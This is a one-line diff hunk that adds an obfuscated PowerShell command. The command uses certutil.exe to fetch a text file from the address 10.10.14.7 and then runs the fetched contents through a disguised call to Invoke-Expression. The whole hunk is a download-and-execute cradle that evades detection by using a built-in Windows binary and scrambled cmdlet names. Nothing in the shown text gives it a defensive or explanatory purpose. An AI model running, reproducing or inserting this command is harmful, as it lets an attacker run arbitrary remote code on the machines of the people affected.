@@ -1,0 +1,1 @@
+SI Variable:\b1 'http://10.10.14.7/load.txt';popd;Set-Variable kv (C:\Windows\System32\certutil.exe /ping (Variable b1 -Value));&(Get-Command *-Ex*n) ((Get-Variable kv).Value[2..(((Get-Variable kv).Value).Length-2)]-Join"`r`n")
